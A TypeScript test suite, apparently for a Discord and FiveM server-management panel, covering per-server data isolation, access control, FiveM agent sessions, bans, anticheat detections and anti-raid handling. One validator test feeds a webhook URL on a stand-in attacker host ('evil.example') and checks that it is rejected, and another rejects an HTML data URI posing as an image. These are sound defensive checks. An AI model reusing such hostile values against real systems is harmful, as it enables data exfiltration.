  const notesOnS = (await stat(A))!.notesCount;
  await db.run("INSERT INTO staff_notes (server_id, discord_id, body, author_discord_id) VALUES (?, ?, 'tango only', ?)", [t.id, A, B]);
  assert.equal((await m.sync.listStaffWithStats(t.id))[0].notesCount, 1);
  assert.equal((await stat(A))!.notesCount, notesOnS);

  const t0 = new Date(Date.now() - 120_000);
  await m.voice.openVoiceSession(t.id, A, [T_ROLE], "930000000000000001", t0);
  assert.equal(await m.voice.isInVoiceNow(t.id, A), true);
  assert.equal(await m.voice.isInVoiceNow(S, A), false);
  // a full voice reconcile of the legacy guild does not close Tango's session
  await m.voice.reconcileVoiceSessions(S, [], new Date());
  assert.equal(await m.voice.isInVoiceNow(t.id, A), true);
  await m.voice.closeVoiceSession(t.id, A, new Date());
  assert.ok((await m.voice.voiceSecondsFor(t.id, A)) >= 119);

  const { audit } = await import("../src/lib/audit");
  const { listLogs } = await import("../src/lib/logs");
  await audit(t.id, { discordId: A, username: "ChefTango" }, "warn_add", A, { level: 1, reason: "test" });
  assert.ok((await listLogs(t.id, {})).rows.every((r) => r.actorName !== "Chef"));
  assert.equal((await listLogs(S, { q: "cheftango" })).total, 0);

  // a reset only restarts the counters of its own server
  const counters = await import("../src/lib/counters");
  await counters.resetCounters(t.id, { discordId: A });
  assert.ok(await counters.getCountersResetAt(t.id));
  assert.equal(await counters.getCountersResetAt(S), null);
});

test("access is per server: owners, listed users and roles only open their own server", async () => {
  const t = await tango();
  const TOWNER = "910000000000000001";
  assert.equal(await m.config.hasPanelAccess(t.id, TOWNER, []), true);
  assert.equal((await m.config.getPermissions(t.id, TOWNER, [])).length > 5, true);
  assert.equal(await m.config.hasPanelAccess(S, TOWNER, []), false); // owner of Tango, nobody on the legacy server
  assert.equal(await m.config.hasPanelAccess(t.id, "1243884102407422024", []), false); // seeded on the legacy server only
  assert.equal(await m.config.hasPanelAccess(t.id, "900000000000000001", []), true); // platform owner: everywhere

  // role-based access needs the user's roles on that guild: looked up at login and cached
  const ROLE = "620000000000000001";
  const USER = "920000000000000009";
  await db.run("INSERT INTO panel_access (server_id, kind, discord_id, permissions) VALUES (?, 'role', ?, '[\"view_logs\"]')", [t.id, ROLE]);
  m.config.invalidateConfig(t.id);
  const { refreshMemberships } = await import("../src/lib/memberships");
  const { listAccessibleServers } = await import("../src/lib/auth");
  const identity = { discordId: USER, username: "Visiteur", avatarUrl: null };
  assert.deepEqual(await listAccessibleServers(identity), []);
  const looked: string[] = [];
  const count = await refreshMemberships(identity, [G2, "999999999999999999"], async (guildId) => {
    looked.push(guildId);
    return { user: { id: USER, username: "Visiteur", avatar: null }, roles: [ROLE], joined_at: null, nick: null };
  });
  assert.equal(count, 1);
  assert.deepEqual(looked, [G2]); // only registered guilds the user is in
  assert.deepEqual((await listAccessibleServers(identity)).map((s) => s.id), [t.id]);
  assert.equal((await m.sync.listStaffWithStats(t.id)).some((x) => x.discordId === USER), false); // access is not staff
});

test("FiveM: each server's own token routes its sessions; session ids never collide across servers", async () => {
  const t = await tango();
  const token = await m.servers.rotateFivemToken(t.id);
  assert.match(token, /^fvm_/);
  assert.equal((await m.servers.serverForFivemToken(token))?.id, t.id);
  assert.equal((await db.get<{ h: string }>("SELECT fivem_token_hash AS h FROM servers WHERE id = ?", [t.id]))!.h.includes(token), false); // only a hash is stored
  const again = await m.servers.rotateFivemToken(t.id);
  assert.equal(await m.servers.serverForFivemToken(token), null); // rotated: the old token is dead
  assert.equal((await m.servers.serverForFivemToken(again))?.id, t.id);

  const ts = Math.floor(Date.now() / 1000) - 100;
  const ev = { event: "session_start" as const, discordId: A, sessionId: "same-id", timestamp: ts };
  assert.deepEqual(await m.fivem.ingestFivemEvent(t.id, ev), { ok: true, action: "opened" });
  assert.deepEqual(await m.fivem.ingestFivemEvent(S, ev), { ok: true, action: "opened" }); // same agent session id, other server
  assert.equal(await m.fivem.isInFivemNow(t.id, A), true);
  await m.fivem.ingestFivemEvent(t.id, { ...ev, event: "session_end", timestamp: ts + 60 });
  assert.equal(await m.fivem.isInFivemNow(t.id, A), false);
  assert.equal(await m.fivem.isInFivemNow(S, A), true); // the legacy session is still open
  await m.fivem.ingestFivemEvent(S, { ...ev, event: "session_end", timestamp: ts + 30 });
  // B is staff on the legacy server only: Tango's agent cannot record them
  assert.deepEqual(await m.fivem.ingestFivemEvent(t.id, { ...ev, discordId: B, sessionId: "b" }), { ok: true, action: "ignored" });
});

test("bot API: routes each guild to its server, ignores unknown guilds, heartbeat per guild", async () => {
  const api = await import("../src/lib/bot-api");
  const t = await tango();
  assert.ok((await api.registeredGuilds()).guilds.some((g) => g.guildId === G2 && g.serverId === t.id));
  assert.deepEqual(
    await api.applyMember(api.memberSchema.parse({ guildId: "599999999999999999", discordId: A, username: "x", avatarUrl: null, roleIds: [], joinedAt: null })),
    { ignored: "unknown_guild" }
  );

  await m.status.clearBotHeartbeat();
  const beat = await api.recordHeartbeat({ guilds: [{ guildId: G2, topRolePosition: 7 }, { guildId: "599999999999999999" }] });
  assert.deepEqual([beat.servers, Object.keys(beat.antiraid)], [1, [G2]]); // settings only for known guilds
  assert.equal((await m.status.getBotStatus(t.id)).alive, true);
  assert.equal((await m.status.getBotStatus(t.id)).topRolePosition, 7);
  assert.equal((await m.status.getBotStatus(S)).alive, false); // the bot did not report the legacy guild

  const NEWT = "700000000000000009";
  await api.applyMember(api.memberSchema.parse({ guildId: G2, discordId: NEWT, username: "Recrue Tango", avatarUrl: null, roleIds: [T_ROLE], joinedAt: null }));
  assert.ok((await m.sync.listStaffWithStats(t.id)).some((x) => x.discordId === NEWT));
  assert.equal(await stat(NEWT), undefined);

  await api.applyVoice(api.voiceEventSchema.parse({ guildId: G2, action: "join", discordId: NEWT, channelId: "930000000000000002", roleIds: [T_ROLE] }));
  assert.equal(await m.voice.isInVoiceNow(t.id, NEWT), true);
  assert.ok((await api.applyShutdown()).closed >= 1); // shutdown closes every server's sessions
  assert.equal(await m.voice.isInVoiceNow(t.id, NEWT), false);
  assert.equal((await m.status.getBotStatus(t.id)).alive, false);
});

test("weekly review and maintenance run per server, in each server's own time zone", async () => {
  const maintenance = await import("../src/lib/maintenance");
  const review = await import("../src/lib/review");
  const t = await tango();
  await m.servers.updateServer(t.id, { timezone: "America/Montreal", reviewHour: 20 });
  const server = (await m.servers.getServer(t.id))!;
  const realFetch = globalThis.fetch;
  process.env.AI_API_KEY = "k";
  try {
    // Sunday 18 Oct 2026 21:00 in Paris (19:00Z) = 15:00 in Montreal: due in Paris, not yet in Montreal.
    const at = new Date("2026-10-18T19:00:00Z");
    assert.equal(await maintenance.reviewDue((await m.servers.getServer(S))!, at), true);
    assert.equal(await maintenance.reviewDue(server, at), false);
    assert.equal(await maintenance.reviewDue(server, new Date("2026-10-19T00:30:00Z")), true); // 20:30 in Montreal

    // the review lock of one server does not block another
    globalThis.fetch = (async () => new Response(JSON.stringify({ choices: [{ message: { content: '{"rating":"green","summary":"ok"}' } }] }))) as typeof fetch;
    assert.equal(await m.status.tryAcquireLock(`review:${t.id}`, 60_000), true);
    assert.deepEqual(await review.generateWeeklyReviews(t.id, 0, { delayMs: 0 }), { ok: false, error: "already_running" });
    assert.equal((await review.generateWeeklyReviews(S, 0, { delayMs: 0 })).ok, true);
  } finally {
    globalThis.fetch = realFetch;
    delete process.env.AI_API_KEY;
    await m.status.releaseLock(`review:${t.id}`);
  }
});

// ---------------------------------------------------------------- self-service

test("Discord permissions: owner, Administrator or Manage Server may register a guild", async () => {
  const { canManageGuild } = await import("../src/lib/discord");
  assert.equal(canManageGuild({ owner: true, permissions: "0" }), true);
  assert.equal(canManageGuild({ permissions: "8" }), true); // Administrator
  assert.equal(canManageGuild({ permissions: "32" }), true); // Manage Server
  assert.equal(canManageGuild({ permissions: "2251799813685247" }), true); // every bit, beyond 2^32
  assert.equal(canManageGuild({ permissions: "1024" }), false); // View Channel only
  assert.equal(canManageGuild({ permissions: "garbage" }), false);
  assert.equal(canManageGuild({}), false);
});

test("self-service: anyone registers a guild they manage, never someone else's, within the per-user limit", async () => {
  const { storeUserGuilds } = await import("../src/lib/memberships");
  const USER = "930000000000000001";
  const MINE = "540000000000000001";
  const NOT_MINE = "540000000000000002";
  await storeUserGuilds(USER, [
    { id: MINE, name: "Mon RP", iconUrl: "https://cdn.discordapp.com/icons/x/y.png", canManage: true },
    { id: NOT_MINE, name: "Serveur d'un autre", iconUrl: null, canManage: false }
  ]);
  const actor = { discordId: USER, platformOwner: false };

  assert.deepEqual((await m.servers.listManageableGuilds(USER)).map((g) => [g.guildId, g.serverId]), [[MINE, null]]);
  assert.deepEqual(await m.servers.createServerFor(actor, { name: "Pirate", guildId: NOT_MINE }), { ok: false, error: "guild_not_managed" });
  assert.deepEqual(await m.servers.createServerFor(actor, { name: "Sans Discord", guildId: null }), { ok: false, error: "guild_required" });

  const created = await m.servers.createServerFor(actor, { name: "Mon RP", guildId: MINE });
  assert.ok(created.ok);
  assert.equal(created.server.iconUrl, "https://cdn.discordapp.com/icons/x/y.png"); // icon taken from Discord
  assert.deepEqual(await m.servers.listServerOwners(created.server.id), [USER]);
  assert.equal(await m.config.hasPanelAccess(created.server.id, USER, []), true);
  assert.equal((await m.servers.listManageableGuilds(USER))[0].serverId, created.server.id);
  assert.deepEqual(await m.servers.createServerFor(actor, { name: "Encore", guildId: MINE }), { ok: false, error: "guild_taken" });

  // a new login replaces the cached guild list (lost permission => can no longer register it)
  await storeUserGuilds(USER, [{ id: NOT_MINE, name: "Serveur d'un autre", iconUrl: null, canManage: false }]);
  assert.equal(await m.servers.managesGuild(USER, MINE), false);

  // limit per user (platform owners are not limited)
  process.env.MAX_SERVERS_PER_USER = "1";
  try {
    await storeUserGuilds(USER, [{ id: "540000000000000003", name: "Deuxième", iconUrl: null, canManage: true }]);
    assert.deepEqual(await m.servers.createServerFor(actor, { name: "Deuxième", guildId: "540000000000000003" }), { ok: false, error: "too_many_servers" });
    const admin = await m.servers.createServerFor({ discordId: "900000000000000001", platformOwner: true }, { name: "Libre", guildId: null });
    assert.ok(admin.ok);
    await m.servers.deleteServer(admin.ok ? admin.server.id : "");
  } finally {
    delete process.env.MAX_SERVERS_PER_USER;
  }
  const clash = await m.servers.createServer({ name: "default", guildId: null, createdBy: USER });
  assert.ok(clash.ok && clash.server.id !== "default"); // the legacy id is never reused
  await m.servers.deleteServer(clash.ok ? clash.server.id : "");
});

test("deleting a server removes all its data and nothing of the other servers", async () => {
  const doomed = await m.servers.createServer({ name: "A supprimer", guildId: "540000000000000009", createdBy: A });
  assert.ok(doomed.ok);
  const id = doomed.server.id;
  await m.roles.storeGuildRoles(id, [{ id: "640000000000000001", name: "Modo", position: 2, color: 0 }]);
  await db.run("INSERT INTO grade_roles (role_id, server_id) VALUES ('640000000000000001', ?)", [id]);
  await m.sync.syncStaffMembers(id, [member(A, ["640000000000000001"])]);
  await m.voice.openVoiceSession(id, A, ["640000000000000001"], "940000000000000001", new Date());
  await db.run("INSERT INTO staff_notes (server_id, discord_id, body, author_discord_id) VALUES (?, ?, 'x', ?)", [id, A, B]);
  await m.status.setServerStatus(id, "heartbeat", new Date().toISOString());
  await m.servers.rotateFivemToken(id);
  await m.agent.handleAgentCall(id, m.agent.agentRequestSchema.parse({
    events: [{ type: "join", session: "d1", name: "Doomed", identifiers: ["license:dead"], timestamp: Math.floor(Date.now() / 1000) }],
    console: [{ message: "hello" }]
  }));
  const doomedPlayer = (await m.players.listPlayers(id)).rows[0].id;
  await m.security.banPlayer(id, { discordId: A }, { playerId: doomedPlayer, reason: "x", source: "manual", expiresAt: null });
  await m.security.recordDetection(id, { playerId: doomedPlayer, playerName: "Doomed", kind: "godmode", details: {}, action: "log" });
  await m.security.storeScreenshot(id, { playerId: doomedPlayer, playerName: "Doomed", reason: "manual", bytes: new Uint8Array([1, 2]), mime: "image/jpeg", requestedBy: null });
  await m.security.recordIncident(id, { kind: "ban", actorId: B, actorName: "b", actorBot: false, summary: "s", details: {}, actions: [], removedRoles: [] });
  const legacyBefore = (await m.sync.listStaffWithStats(S)).length;

  assert.equal(await m.servers.deleteServer(id), true);
  assert.equal(await m.servers.getServer(id), null);
  for (const table of ["staff_members", "voice_sessions", "staff_notes", "discord_roles", "grade_roles", "server_owners", "audit_log", "players", "player_sessions", "fivem_state", "fivem_console",
    "security_settings", "bans", "ac_detections", "ac_screenshots", "security_incidents"]) {
    assert.equal((await db.get<{ n: number }>(`SELECT COUNT(*) AS n FROM ${table} WHERE server_id = ?`, [id]))!.n, 0, table);
  }
  assert.equal((await db.get<{ n: number }>("SELECT COUNT(*) AS n FROM bot_status WHERE key LIKE ?", [`${id}:%`]))!.n, 0);
  assert.equal((await m.sync.listStaffWithStats(S)).length, legacyBefore); // other servers untouched
  assert.equal(await m.servers.getServerByGuild("540000000000000009"), null); // the guild can be registered again
  assert.equal(await m.servers.deleteServer(id), false);
});

// ---- two-way FiveM agent ----

const agentCall = (serverId: string, body: unknown, now?: Date) => m.agent.handleAgentCall(serverId, m.agent.agentRequestSchema.parse(body), now);
const AG = "agent-srv";

test("agent request: Lua empty tables ({}) are empty lists, IP identifiers are dropped", () => {
  const parsed = m.agent.agentRequestSchema.parse({ events: {}, console: {}, results: {}, state: { hostname: "h", maxClients: 64, uptime: 12.7, players: {}, resources: {} } });
  assert.deepEqual([parsed.events, parsed.console, parsed.results, parsed.state?.players], [[], [], [], []]);
  assert.equal(parsed.state?.uptime, 12);
  const ids = m.agent.parseIdentifiers(["ip:1.2.3.4", "steam:11", "license:abc", `discord:${A}`]);
  assert.deepEqual(ids, { license: "license:abc", discordId: A, kept: ["steam:11", "license:abc", `discord:${A}`] });
  assert.equal(m.agent.parseIdentifiers(["ip:1.2.3.4"]).license, null);
});

test("agent: joins and leaves build the player list, staff playtime is counted, boot closes old sessions", async () => {
  const t = Math.floor(Date.now() / 1000) - 3600;
  await agentCall(S, {
    boot: true,
    version: "2.0.0",
    events: [
      { type: "join", session: "p1", name: "Alice", identifiers: ["license:alice", `discord:${A}`, "ip:9.9.9.9"], timestamp: t },
      { type: "join", session: "p2", name: "Bob", identifiers: ["license:bob"], timestamp: t + 60 }
    ],
    state: { hostname: "Mon serveur", maxClients: 64, uptime: 100, players: [{ id: 1, name: "Alice", session: "p1", ping: 30 }, { id: 2, name: "Bob", session: "p2", ping: 80 }], resources: [{ name: "chat", state: "started" }] }
  });
  const live = await m.agent.getLiveState(S);
  assert.equal(live.online, true);
  assert.equal(live.agentVersion, "2.0.0");
  assert.deepEqual(live.players.map((p) => [p.id, p.name, Boolean(p.staff), p.discordId]), [[1, "Alice", true, A], [2, "Bob", false, null]]);
  assert.equal(await m.fivem.isInFivemNow(S, A), true); // staff member: also tracked on the staff pages

  await agentCall(S, { events: [{ type: "leave", session: "p1", reason: "Exiting", timestamp: t + 600 }] });
  await agentCall(S, { events: [{ type: "leave", session: "p1", reason: "replay", timestamp: t + 900 }] }); // replay ignored
  assert.equal(await m.fivem.isInFivemNow(S, A), false);
  const { rows } = await m.players.listPlayers(S, { q: "alice" });
  assert.equal(rows.length, 1);
  assert.deepEqual([rows[0].connections, rows[0].playSeconds, rows[0].online, rows[0].staff?.grade], [1, 600, false, "Admin"]);
  const detail = (await m.players.getPlayer(S, rows[0].id))!;
  assert.deepEqual(detail.identifiers, ["license:alice", `discord:${A}`]); // no IP stored
  assert.equal(detail.sessions[0].leaveReason, "Exiting");

  // Alice comes back under another name: same player (license), name updated, Discord link kept.
  await agentCall(S, { events: [{ type: "join", session: "p3", name: "Alice2", identifiers: ["license:alice"], timestamp: t + 1200 }] });
  const again = (await m.players.listPlayers(S, { q: "license:alice" })).rows[0];
  assert.deepEqual([again.id, again.name, again.connections, again.online, again.discordId], [rows[0].id, "Alice2", 2, true, A]);

  // Server restarted: the agent boots again and every open session is closed.
  await agentCall(S, { boot: true });
  assert.equal((await m.players.listPlayers(S)).rows.filter((p) => p.online).length, 0);
});

test("agent: actions are queued, handed over once, and their result reported back", async () => {
  await agentCall(AG, { state: { hostname: "x", maxClients: 8, uptime: 1, players: [], resources: [] } });
  const id = await m.agent.enqueueCommand(AG, { discordId: A, username: "a" }, "announce", { message: "Reboot dans 5 min" });
  assert.equal((await m.agent.getCommandStatus(AG, id))?.status, "pending");
  assert.equal(await m.agent.getCommandStatus("other", id), null); // another server cannot read it

  const first = await agentCall(AG, {});
  assert.deepEqual(first.commands, [{ id, kind: "announce", payload: { message: "Reboot dans 5 min" } }]);
  assert.equal(first.interval, 2); // actions in flight: fast pace
  assert.deepEqual((await agentCall(AG, {})).commands, []); // never handed twice
  await agentCall("other", { results: [{ id, ok: true }] }); // another server cannot answer for it
  assert.equal((await m.agent.getCommandStatus(AG, id))?.status, "sent");
  await agentCall(AG, { results: [{ id, ok: false, message: "Ressource introuvable" }] });
  assert.deepEqual(await m.agent.getCommandStatus(AG, id), { id, status: "failed", result: "Ressource introuvable" });

  // Not picked up in time (server off): expired, never run later.
  const late = await m.agent.enqueueCommand(AG, { discordId: A }, "refresh", {});
  assert.deepEqual((await agentCall(AG, {}, new Date(Date.now() + 3 * 60_000))).commands, []);
  assert.equal((await m.agent.getCommandStatus(AG, late))?.status, "expired");
  // Picked up but never answered: shown as lost after a minute.
  const lost = await m.agent.enqueueCommand(AG, { discordId: A }, "refresh", {});
  await agentCall(AG, {});
  assert.equal((await m.agent.getCommandStatus(AG, lost, new Date(Date.now() + 2 * 60_000)))?.status, "lost");

  const logs = await db.all<{ action: string }>("SELECT action FROM audit_log WHERE server_id = ? ORDER BY id", [AG]);
  assert.deepEqual(logs.map((l) => l.action), ["announce", "resource", "resource"]);
});

test("agent: pace follows the live pages, offline after silence, console keeps its tail", async () => {
  const t0 = new Date();
  await db.run("UPDATE fivem_state SET watched_at = NULL WHERE server_id = ?", [AG]);
  assert.equal((await agentCall(AG, {}, t0)).interval, 8);
  await m.agent.getLiveState(AG, { watch: true }, t0);
  assert.equal((await agentCall(AG, {}, t0)).interval, 2);
  const later = await m.agent.getLiveState(AG, {}, new Date(t0.getTime() + 60_000));
  assert.deepEqual([later.online, later.players.length], [false, 0]);

  await agentCall(AG, { console: Array.from({ length: 500 }, (_, i) => ({ channel: "c", message: `a${i}` })) });
  await agentCall(AG, { console: Array.from({ length: 500 }, (_, i) => ({ message: `b${i}` })) });
  await agentCall(AG, { console: [{ message: "last" }] });
  const lines = await m.agent.getConsole(AG, 0, 5000);
  assert.equal(lines.length, 1000);
  assert.equal(lines.at(-1)?.message, "last");
  assert.deepEqual((await m.agent.getConsole(AG, lines.at(-2)!.id)).map((l) => l.message), ["last"]);
});

test("stale player sessions are closed at the agent's last sign of life", async () => {
  const start = new Date(Date.now() - 3 * 3600_000);
  const lastSeen = new Date(start.getTime() + 1800_000);
  await agentCall("stale-srv", { events: [{ type: "join", session: "s", name: "Zed", identifiers: ["license:zed"], timestamp: Math.floor(start.getTime() / 1000) }] }, lastSeen);
  assert.equal(await m.agent.closeStalePlayerSessions(12 * 3600), 1);
  const zed = (await m.players.listPlayers("stale-srv")).rows[0];
  assert.deepEqual([zed.online, zed.playSeconds], [false, 1800]);
});

// ---- security: anticheat, bans, screenshots, anti-raid ----

const SEC = "sec-srv";
const ts = (d = new Date()) => Math.floor(d.getTime() / 1000);

test("security settings: defaults, stored values merged with defaults, unknown keys dropped, rev bumped", async () => {
  const fresh = await m.security.getSecuritySettings(SEC);
  assert.equal(fresh.anticheat.enabled, true);
  assert.equal(fresh.anticheat.detections.event_honeypot.action, "ban");
  assert.equal(fresh.antiraid.enabled, false); // the bot never acts until an owner turns it on
  assert.equal(fresh.antiraid.rules.role_delete.max, 0);

  const edited = m.securityConfig.anticheatSchema.parse({ detections: { godmode: { action: "kick", screenshot: false }, not_a_detection: { action: "ban", screenshot: true } } });
  await m.security.saveSecuritySettings(SEC, { discordId: A }, "anticheat", edited);
  const after = await m.security.getSecuritySettings(SEC);
  assert.deepEqual(after.anticheat.detections.godmode, { action: "kick", screenshot: false });
  assert.equal(after.anticheat.detections.superjump.action, "kick"); // untouched: its default
  assert.equal("not_a_detection" in after.anticheat.detections, false);
  assert.ok(after.rev > fresh.rev);
});

test("agent security: settings and bans are sent only when the agent's rev is stale", async () => {
  const first = await agentCall(SEC, { secRev: 0 });
  assert.ok(first.security);
  assert.equal(first.security.anticheat.detections.godmode.action, "kick");
  const again = await agentCall(SEC, { secRev: first.security.rev });
  assert.equal(again.security, undefined);
  assert.equal(again.watch, false);
});

test("anticheat: a ban detection bans the player on identifiers and hardware tokens (never the IP); the agent gets it", async () => {
  const t = ts();
  await agentCall(SEC, { events: [{ type: "join", session: "c1", name: "Cheater", identifiers: ["license:cheat", "ip:9.9.9.9", "steam:1", `discord:${B}`], tokens: ["4:abc", "3:def"], timestamp: t }] });
  // A later join without tokens keeps the known ones.
  await agentCall(SEC, { events: [{ type: "leave", session: "c1", timestamp: t + 5 }, { type: "join", session: "c2", name: "Cheater", identifiers: ["license:cheat"], timestamp: t + 10 }] });
  const { rev } = await m.security.getSecuritySettings(SEC);
  const res = await agentCall(SEC, {
    secRev: rev,
    events: [{ type: "detection", session: "c2", name: "Cheater", kind: "event_honeypot", action: "ban", details: { event: "esx_truckerjob:pay" }, timestamp: t + 20 }]
  });
  assert.ok(res.security, "the new ban bumps the rev");
  const ban = res.security.bans.find((b) => b.reason.includes("Événement piège"));
  assert.ok(ban);
  assert.deepEqual([...ban.ids].sort(), ["license:cheat"]); // identifiers as last seen (the second join)
  assert.deepEqual(ban.tokens, ["4:abc", "3:def"]);
  assert.equal(ban.expires, null);

  const [detection] = await m.security.listDetections(SEC);
  assert.deepEqual([detection.kind, detection.action, detection.playerName], ["event_honeypot", "ban", "Cheater"]);
  assert.ok(detection.playerId);
  const logs = await db.all<{ action: string; actor_discord_id: string }>("SELECT action, actor_discord_id FROM audit_log WHERE server_id = ?", [SEC]);
  assert.ok(logs.some((l) => l.action === "player_ban" && l.actor_discord_id === "fiverax"));

  assert.equal(await m.security.reviewDetection(SEC, { discordId: A }, detection.id, "dismissed"), true);
  assert.equal(await m.security.reviewDetection("other", { discordId: A }, detection.id, "confirmed"), false); // other server
});

test("bans: temporary bans expire, revoked bans leave the agent's list, search and per-player lists", async () => {
  const now = new Date();
  const player = (await m.players.listPlayers(SEC)).rows.find((p) => p.name === "Cheater")!;
  await m.security.banPlayer(SEC, { discordId: A }, { playerId: player.id, reason: "Freekill", source: "manual", expiresAt: new Date(now.getTime() + 3600_000).toISOString() }, now);
  await m.security.banPlayer(SEC, { discordId: A }, { playerId: player.id, reason: "Ancien", source: "manual", expiresAt: new Date(now.getTime() - 1000).toISOString() }, now);
  assert.equal(await m.security.banPlayer(SEC, { discordId: A }, { playerId: 999999, reason: "x", source: "manual", expiresAt: null }), false);

  const active = await m.security.listBans(SEC, { active: true });
  assert.deepEqual(active.map((b) => b.reason).sort(), ["Anticheat : Événement piège", "Freekill"]);
  assert.equal((await m.security.listBans(SEC, { q: "Freekill" })).length, 1);
  assert.equal((await m.security.listBans(SEC, { playerId: player.id })).length, 3);
  assert.equal((await m.security.activeBansForAgent(SEC)).length, 2);

  const freekill = active.find((b) => b.reason === "Freekill")!;
  assert.equal(await m.security.revokeBan(SEC, { discordId: A }, freekill.id), true);
  assert.equal(await m.security.revokeBan(SEC, { discordId: A }, freekill.id), false); // already revoked
  assert.equal((await m.security.activeBansForAgent(SEC)).length, 1);
  assert.equal(m.security.isBanActive({ revokedAt: null, expiresAt: null }), true);
});

test("screenshots: data URIs decoded, attached to their detection, AI verdict parsed, skipped without a key", async () => {
  const png = `data:image/png;base64,${Buffer.from([137, 80, 78, 71]).toString("base64")}`;
  const decoded = m.security.decodeImage(png);
  assert.deepEqual([decoded?.mime, decoded?.bytes.length], ["image/png", 4]);
  assert.equal(m.security.decodeImage("data:text/html;base64,PHA+"), null);
  assert.equal(m.security.decodeImage("not a data uri"), null);

  const player = (await m.players.listPlayers(SEC)).rows.find((p) => p.name === "Cheater")!;
  const detectionId = await m.security.recordDetection(SEC, { playerId: player.id, playerName: "Cheater", kind: "godmode", details: {}, action: "log" });
  const shotId = await m.security.storeScreenshot(SEC, { playerId: player.id, playerName: "Cheater", reason: "godmode", bytes: decoded!.bytes, mime: "image/png", requestedBy: null });
  assert.equal((await m.security.listDetections(SEC, { kind: "godmode" })).find((d) => d.id === detectionId)?.screenshotId, shotId);
  // The agent uploads the screenshot before it reports the detection: linked the other way round.
  const early = await m.security.storeScreenshot(SEC, { playerId: player.id, playerName: "Cheater", reason: "superjump", bytes: decoded!.bytes, mime: "image/png", requestedBy: null });
  const late = await m.security.recordDetection(SEC, { playerId: player.id, playerName: "Cheater", kind: "superjump", details: {}, action: "kick" });
  assert.equal((await m.security.listDetections(SEC, { kind: "superjump" })).find((d) => d.id === late)?.screenshotId, early);
  const image = await m.security.getScreenshotImage(SEC, shotId);
  assert.deepEqual([...(image?.image ?? [])], [137, 80, 78, 71]);
  assert.equal(await m.security.getScreenshotImage("other", shotId), null);

  assert.deepEqual(m.vision.parseVerdict('```json\n{"verdict":"CHEAT","score":97.4,"summary":"Menu Eulen ouvert"}\n```'), { verdict: "cheat", score: 97, summary: "Menu Eulen ouvert" });
  assert.equal(m.vision.parseVerdict('{"verdict":"maybe","score":5}'), null);
  delete process.env.AI_API_KEY;
  assert.equal((await m.vision.analyzeScreenshot(decoded!.bytes, "image/png")).verdict, "skipped");

  await m.security.setScreenshotVerdict(SEC, shotId, { verdict: "cheat", score: 92, summary: "ESP" });
  assert.equal((await m.security.listScreenshots(SEC, { verdict: "cheat" }))[0].id, shotId);
  assert.equal((await m.security.securityOverview(SEC)).flaggedShots24h, 1);
});

test("security retention: screenshots after 30 days, detections and incidents after 180", async () => {
  const old = new Date(Date.now() - 31 * 86400_000);
  const shot = await m.security.storeScreenshot(SEC, { playerId: null, playerName: "Old", reason: "random", bytes: new Uint8Array([1]), mime: "image/jpeg", requestedBy: null }, old);
  await m.security.pruneSecurityData();
  assert.equal(await m.security.getScreenshotImage(SEC, shot), null);
  assert.ok((await m.security.listScreenshots(SEC)).length > 0); // recent ones kept
});

test("anti-raid incidents: stored per guild, recreated roles keep the panel's grade / avert / access rules", async () => {
  const api = await import("../src/lib/bot-api");
  const guild = "560000000000000001";
  const created = await m.servers.createServer({ name: "Raid RP", guildId: guild, createdBy: A });
  assert.ok(created.ok);
  const id = created.server.id;
  const [oldRole, newRole] = ["660000000000000001", "660000000000000002"];
  await db.batch([
    m.db.stmt("INSERT INTO grade_roles (role_id, server_id) VALUES (?, ?)", [oldRole, id]),
    m.db.stmt("INSERT INTO warn_roles (server_id, level, role_id) VALUES (?, 1, ?)", [id, oldRole]),
    m.db.stmt("INSERT INTO panel_access (server_id, kind, discord_id, permissions) VALUES (?, 'role', ?, '[]')", [id, oldRole])
  ]);

  const incident = api.incidentSchema.parse({
    guildId: guild, kind: "role_delete", actorId: B, actorName: "Raider", summary: "Suppression de rôle : 1 action(s)",
    details: { remaps: [{ from: oldRole, to: newRole }] },
    actions: [{ type: "Rôle recréé", ok: true, detail: "@Staff, redonné à 12/12 membre(s)" }, { type: "Auteur derank", ok: true }],
    removedRoles: ["660000000000000003"]
  });
  const result = await api.applyIncident(incident);
  assert.ok("id" in result);
  const [stored] = await m.security.listIncidents(id);
  assert.deepEqual([stored.kind, stored.actorId, stored.actions.length, stored.removedRoles], ["role_delete", B, 2, ["660000000000000003"]]);
  assert.equal((await db.get<{ n: number }>("SELECT COUNT(*) AS n FROM grade_roles WHERE server_id = ? AND role_id = ?", [id, newRole]))!.n, 1);
  assert.equal((await db.get<{ role_id: string }>("SELECT role_id FROM warn_roles WHERE server_id = ?", [id]))!.role_id, newRole);
  assert.equal((await db.get<{ discord_id: string }>("SELECT discord_id FROM panel_access WHERE server_id = ? AND kind = 'role'", [id]))!.discord_id, newRole);

  await m.security.markIncidentRestored(id, { discordId: A }, stored.id);
  assert.ok((await m.security.getIncident(id, stored.id))?.restoredAt);
  assert.deepEqual(await api.applyIncident({ ...incident, guildId: "569999999999999999" }), { ignored: "unknown_guild" });

  // The bot gets each guild's anti-raid settings with the guild list and the heartbeat.
  const { guilds } = await api.registeredGuilds();
  assert.equal(guilds.find((g) => g.guildId === guild)?.antiraid.enabled, false);
  const beat = await api.recordHeartbeat({ guilds: [{ guildId: guild }] });
  assert.ok(guild in beat.antiraid);
});

// ---- security, part 2: escalation, alerts, connections, live screen, bot actions, backups ----

const SEC2 = "sec2-srv";

test("anticheat settings: new sections have safe defaults; webhook URLs are checked", () => {
  const d = m.securityConfig.DEFAULT_ANTICHEAT;
  assert.deepEqual([d.banHours, d.strikes.enabled, d.alerts.webhookUrl, d.connection.locked, d.connection.whitelist], [0, false, null, false, []]);
  assert.equal(m.securityConfig.anticheatSchema.safeParse({ alerts: { webhookUrl: "https://evil.example/hook" } }).success, false);
  assert.equal(m.securityConfig.anticheatSchema.safeParse({ alerts: { webhookUrl: "https://discord.com/api/webhooks/123/abc-DEF_9" } }).success, true);
  const r = m.securityConfig.DEFAULT_ANTIRAID;
  assert.deepEqual([r.messages.enabled, r.protectedRoles, r.backupEveryHours, r.rules.protected_role.max], [false, [], 12, 0]);
});

test("alerts: only from the chosen level, AI cheats always when asked", async () => {
  const { shouldAlert } = await import("../src/lib/alerts");
  const s = m.securityConfig.anticheatSchema.parse({ alerts: { webhookUrl: "https://discord.com/api/webhooks/1/x", minAction: "kick" } });
  assert.equal(shouldAlert(s, { kind: "godmode", action: "log" }), false);
  assert.equal(shouldAlert(s, { kind: "godmode", action: "ban" }), true);
  assert.equal(shouldAlert(s, { kind: "ai_screenshot", action: "log" }), true);
  assert.equal(shouldAlert(m.securityConfig.DEFAULT_ANTICHEAT, { kind: "godmode", action: "ban" }), false); // no webhook
